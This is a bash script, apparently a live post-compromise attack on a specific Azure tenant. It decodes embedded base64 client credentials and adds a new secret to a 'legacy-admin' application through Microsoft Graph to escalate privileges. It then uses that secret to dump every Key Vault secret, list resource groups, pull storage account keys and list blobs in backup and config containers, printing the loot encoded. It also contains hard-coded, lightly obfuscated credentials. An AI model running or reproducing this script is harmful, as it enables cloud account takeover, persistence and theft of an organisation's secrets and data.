#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" \
  -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "GT_LEN=${#GT}"

# Retry addPassword on legacy-admin with delay
sleep 3
echo "=== ADD PW LEGACY ==="
R1=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" \
  -H "Authorization: Bearer $GT" \
  -H "Content-Type: application/json" \
  -d "{\"passwordCredential\":{\"displayName\":\"lh-la-$(date +%s)\"}}")
echo "LEGACY_B64=$(echo "$R1" | base64 -w0)"

LA_SECRET=$(echo "$R1" | jq -r ".secretText // empty")
if [ -n "$LA_SECRET" ]; then
  echo "GOT LEGACY SECRET len=${#LA_SECRET}"
  
  # Try all scopes
  VT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=$LA_SECRET" \
    -d "scope=https://vault.azure.net/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "VT_LEN=${#VT}"
  
  # KV2 secrets
  KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $VT")
  echo "KV2_B64=$(echo "$KV2" | base64 -w0)"
  
  # Read each secret
  for SID in $(echo "$KV2" | jq -r ".value[]?.id // empty"); do
    SVAL=$(curl -sS "$SID?api-version=7.4" \
      -H "Authorization: Bearer $VT" | jq -r ".value // .error.code")
    SNAME=$(basename "$SID")
    echo "SECRET_${SNAME}=$SVAL"
  done
  
  # Management 
  MT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=$LA_SECRET" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "MT_LEN=${#MT}"
  
  # List all RGs
  curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourcegroups?api-version=2021-04-01" \
    -H "Authorization: Bearer $MT" | jq -r ".value[]?.name // .error.code"
  
  # ListKeys
  for ACCT in sttblbackupprodx3euoz sttblappcfgprodx3euoz; do
    KEYS=$(curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$ACCT/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer $MT")
    echo "KEYS_${ACCT:0:12}=$(echo "$KEYS" | jq -r ".keys[0].value // .error.code")"
  done
  
  # Storage bearer
  ST=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=$LA_SECRET" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "ST_LEN=${#ST}"
  
  # Try blob listing with bearer
  for EP in "sttblbackupprodx3euoz/exports" "sttblappcfgprodx3euoz/config"; do
    ACCT=$(echo "$EP" | cut -d/ -f1)
    CONT=$(echo "$EP" | cut -d/ -f2)
    BLOBS=$(curl -sS "https://$ACCT.blob.core.windows.net/$CONT?restype=container&comp=list" \
      -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02")
    echo "BLOBS_${CONT}=$(echo "$BLOBS" | head -c 1000 | base64 -w0)"
  done
else
  echo "Legacy still failed: $(echo "$R1" | jq -r ".error.code")"
  
  # Retry once more after delay
  sleep 5
  R1B=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{\"passwordCredential\":{\"displayName\":\"lh-la2-$(date +%s)\"}}")
  echo "LEGACY2_B64=$(echo "$R1B" | base64 -w0)"
fi

echo "=== DONE ==="
